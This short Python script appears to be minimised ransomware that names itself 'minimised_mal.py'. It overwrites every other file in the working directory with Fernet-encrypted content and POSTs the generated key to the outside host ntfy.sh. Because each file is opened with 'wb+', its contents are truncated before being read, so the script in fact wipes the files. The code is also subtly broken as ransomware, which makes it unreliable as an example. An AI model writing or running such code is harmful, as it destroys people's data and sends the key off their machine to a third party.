import os;from http.client import HTTPConnection;from cryptography.fernet import Fernet;a=Fernet.generate_key()
for y in os.listdir():
    if y!="minimised_mal.py"and os.path.isfile(y):
        with open(y,"wb+")as x:x.write(Fernet(a).encrypt(x.read()))
HTTPConnection("ntfy.sh").request("POST",'/test',a)
